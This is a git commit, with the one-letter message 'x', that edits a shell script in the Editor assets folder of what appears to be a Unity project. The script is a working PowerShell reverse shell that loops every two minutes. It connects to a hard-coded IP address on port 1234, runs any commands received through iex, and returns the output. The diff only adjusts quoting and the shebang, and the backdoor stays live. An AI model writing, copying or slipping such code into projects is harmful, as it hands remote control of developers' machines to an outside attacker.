ff022ec88854185070c0558750cbc63eab08ddb8
zhiganghuang <zhiganghuang@unity3d.com>
2025-05-09 15:21:27 +0800

    x

--- Assets/Editor/ReverseShellWinloop.sh
+++ Assets/Editor/ReverseShellWinloop.sh
@@ -1,5 +1,5 @@
-#!/usr/bin/env bash
+#!/bin/bash
 while true; do
-	powershell -c "\$client = New-Object System.Net.Sockets.TCPClient('164.92.93.171',1234); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){ \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String); \$sendback2 = \$sendback + 'PS ' + (Get-Location).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()"
-    sleep 120  # 300 seconds = 2 minutes
+    powershell -c '$client = New-Object System.Net.Sockets.TCPClient("164.92.93.171",1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()'
+    sleep 120  # 2 minutes
 done
